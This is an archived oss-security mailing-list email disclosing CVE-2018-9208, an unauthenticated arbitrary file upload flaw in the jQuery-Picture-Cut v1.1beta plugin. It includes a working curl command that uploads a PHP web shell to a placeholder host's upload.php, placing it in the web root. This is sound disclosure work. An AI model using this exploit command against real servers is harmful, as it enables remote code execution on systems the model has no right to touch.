X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1462" "Tuesday" "20" "November" "2018" "17:05:41" "-0500" "Larry W. Cashdollar" "larry0@me.com" "<89E9855C-DA89-4F14-88BB-81AD23B76A20@me.com>" "35" "[oss-security] Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1beta" nil nil nil "11" "2018112022:05:41" "[oss-security] Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1beta" (number mark "U       larry0@me.co Nov 20   35/1462  " thread-indent "\"[oss-security] Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1beta\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 11717 invoked by uid 550); 20 Nov 2018 22:06:22 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11699 invoked from network); 20 Nov 2018 22:06:22 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1542751549; bh=Tk+zKfKxZYv0Btq7+jBOgJRguUWQQ2yDxnPZJ4GKpjw=;
	h=Date:Subject:From:To:Message-id:MIME-version:Content-type;
	b=e8CiQz/FrTtUm3F//MF5sqWIfi8LqE8PWTx3nnoj5Wa71bELKnv3UBtI0NMVZA670
 dVpr+v/WN/fvJ2ErLDH5ze1wiBccOP4mf4VzpjKwAKshuLW3I//P/F1Tjv1Wc5+XAk
 jvsuu7djePr3B0rDvcevwuKgYyKRYaGzJYOeyN1adwoR2tTE+qHfd00enG6FpunlsF
 gNuHDYdchoGTGWCth/EoaAFMifZlhJoI1JsfLH9WD2gs0c502GfODybUS8qO+wm0PE
 9hubRJu8lsTw99u5DzRradEWSYfkW5K3Uw+AJ67jS0EqZ+yBt6jUnwv+cpKsceotwG
 xRyHVSostvZhw==
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 suspectscore=0
 malwarescore=0 phishscore=0 bulkscore=0 spamscore=0 clxscore=1015 mlxscore=0
 mlxlogscore=565 adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1807170000 definitions=main-1811200193
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,,
 definitions=2018-11-20_10:,, signatures=0
User-Agent: Microsoft-MacOutlook/10.13.0.181109
Date: Tue, 20 Nov 2018 17:05:41 -0500
From: "Larry W. Cashdollar" <larry0@me.com>
To: Open Security <oss-security@lists.openwall.com>
Message-id: <89E9855C-DA89-4F14-88BB-81AD23B76A20@me.com>
Thread-topic: Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1beta
MIME-version: 1.0
Content-type: text/plain; charset=UTF-8
Content-transfer-encoding: quoted-printable
Subject: [oss-security] Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1beta

Title:=C2=A0Arbitrary file upload vulnerability in jQuery-Picture-Cut v1.1b=
eta
Author:=C2=A0Larry W. Cashdollar, @_larry0
Date:=C2=A02018-11-02
CVE-ID:CVE-2018-9208
CWE:=C2=A0CWE-434 arbitrary file upload
Download Site:=C2=A0https://github.com/TuyoshiVinicius/jQuery-Picture-Cut
Vendor:=C2=A0http://picturecut.tuyoshi.com.br/
Vendor Notified:=C2=A02018-11-03
Vendor Contact:=C2=A0tuyoshi_vinicius@hotmail.com
Advisory:=C2=A0http://www.vapidlabs.com/advisory.php?v=3D207

Description:=C2=A0picture cut is a jquery plugin that handles images in a v=
ery friendly and simple way, with a beautiful interface based on bootstrap =
or jquery ui, has great features like ajax upload, drag image from explorer=
, image crop and others.

Vulnerability:
The code in jQuery-Picture-Cut/src/php/upload.php that calls ../core/Pictur=
eCut.php to handle the file upload does not check file type and allows the =
user to choose the file location path. An unauthenticated user and upload a=
n executable PHP file to the server allowing code execution.

Exploit Code:

1. curl  -F  "inputOfFile=3Dfile" -F "request=3Dupload" -F "enableResize=3D=
0" -F "minimumWidthToResize=3D0" -F "minimumHeightToResize=3D0" -F "folderO=
nServer=3D/" -F "imageNameRandom=3D1" -F "maximumSize=3D10000" -F "enableMa=
ximumSize=3D0" -F "file=3D@shell.php" http://example.com/jQuery-Picture-Cut=
/src/php/upload.php

3. With folderOnServer=3D/ the shell will be in the main web directory path.



